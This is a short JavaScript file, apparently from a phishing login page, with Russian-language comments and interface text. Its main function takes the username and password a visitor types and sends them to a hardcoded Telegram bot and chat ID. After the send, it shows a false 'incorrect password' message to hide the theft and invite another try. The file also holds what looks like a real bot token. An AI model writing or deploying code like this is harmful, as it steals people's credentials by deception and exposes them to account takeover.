function showErrorMessage(message) {
    const errorMessage = document.getElementById('error-message');
    errorMessage.textContent = message;
    errorMessage.style.display = 'block';
}

function sendToTelegram() {
    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value.trim();

    if (username === "" || password === "") {
        showErrorMessage("Заполните все поля!");
        return;
    }

    let botToken = "7717544851:AAGHeXPyrmMXp3hZre6FKCzx2zE27Jt4O_A";  // Удали токен перед публикацией
    let chatId = "5444484112"; // Замените на ваш чат ID
    let message = `🔑 Новый логин!\n👤 Логин: ${username}\n🔒 Пароль: ${password}`;

    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    console.log("URL:", url); // Log the URL to check it's correct

    fetch(url)
        .then(response => response.json())
        .then(data => {
            console.log("Telegram response:", data); // Log the response from Telegram API
            if (data.ok) {
                showErrorMessage("К сожалению, вы ввели неправильный пароль. Проверьте свой пароль еще раз."); // Success message
            } else {
                showErrorMessage("Не удалось обработать. Попробуйте снова."); // Error message
            }
        })
        .catch(error => {
            console.error("Ошибка:", error); // Log any errors to the console
            showErrorMessage("Не удалось отправить данные.");
        });

    // Очистка полей
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
}


document.getElementById('toggle-password').addEventListener('click', function() {
    const passwordField = document.getElementById('password');
    const passwordType = passwordField.type === 'password' ? 'text' : 'password';
    passwordField.type = passwordType;
    
    // Меняем placeholder в зависимости от того, показываем ли мы пароль или нет
    if (passwordType === 'password') {
        passwordField.setAttribute('placeholder', 'Пароль');
        this.textContent = 'Показать';
    } else {
        passwordField.setAttribute('placeholder', 'Пароль отображен');
        this.textContent = 'Скрыть';
    }
});
